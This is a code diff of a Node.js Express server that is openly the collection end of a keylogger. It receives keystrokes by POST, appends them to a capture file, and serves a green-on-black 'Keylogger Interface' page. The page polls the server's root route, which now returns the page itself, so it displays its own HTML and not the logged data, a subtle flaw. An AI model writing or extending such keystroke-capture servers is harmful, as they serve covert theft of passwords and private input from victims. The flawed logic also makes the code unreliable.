@@ -9,27 +9,99 @@ app.use(bodyParser.json({ extended: true }));
 
 const port = 8080;
 
-// Route to handle GET requests and display logged keystrokes
+// HTML for keylogger-style interface
+const htmlForm = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keylogger Interface</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #0f0;
+            font-family: monospace;
+            padding: 20px;
+        }
+        #content {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        textarea {
+            width: 100%;
+            height: 200px;
+            background-color: #000;
+            color: #0f0;
+            border: 1px solid #0f0;
+            padding: 10px;
+            font-family: monospace;
+        }
+        button {
+            background-color: #00f;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-family: monospace;
+        }
+        button:hover {
+            background-color: #0033cc;
+        }
+        #loggedData {
+            margin-top: 20px;
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <div id="content">
+        <h1>Keylogger Interface</h1>
+        <textarea id="keyboardData" placeholder="Waiting for keystrokes..." readonly></textarea><br>
+        <button id="clearBtn">Clear</button>
+        <hr>
+        <h2>Logged Data</h2>
+        <pre id="loggedData">Nothing Logged yet.</pre>
+    </div>
+    
+    <script>
+        // Function to fetch and display logged data
+        function fetchLoggedData() {
+            fetch('/')
+                .then(response => response.text())
+                .then(data => {
+                    document.getElementById('loggedData').innerText = data;
+                })
+                .catch(error => console.error('Error fetching data:', error));
+        }
+
+        // Fetch logged data initially when the page loads
+        fetchLoggedData();
+
+        // Function to fetch logged data every 5 seconds
+        setInterval(fetchLoggedData, 5000);
+
+        // Function to clear textarea
+        document.getElementById('clearBtn').addEventListener('click', function() {
+            document.getElementById('keyboardData').value = '';
+        });
+    </script>
+</body>
+</html>
+`;
+
+// Route to serve HTML interface
 app.get("/", (req, res) => {
-    try {
-        // Read the keystrokes from the file
-        const kl_file = fs.readFileSync("./keystroke_captures.txt", { encoding: 'utf8', flag: 'r' });
-        
-        // Replace newline characters with <br> for HTML formatting
-        res.send(`<h1>Logged data</h1><p>${kl_file.replace("\n", "<br>")}</p>`);
-    } catch {
-        // If file doesn't exist or any error occurs, send a message indicating no data
-        res.send("<h1>Nothing Logged yet.</h1>");
-    }
+    res.send(htmlForm);
 });
 
 // Route to handle POST requests and save the keystrokes data
 app.post("/", (req, res) => {
     console.log(req.body.keyboardData);
     
-    // Write the received keystrokes data to the file
-    fs.writeFileSync("keystroke_captures.txt", req.body.keyboardData);
-    res.send("Successfully set the data");
+    // Append the received keystrokes data to the file
+    fs.appendFileSync("keystroke_captures.txt", req.body.keyboardData + "\n");
+    res.send("Successfully logged the data");
 });
 
 // Start the server and listen on the specified port
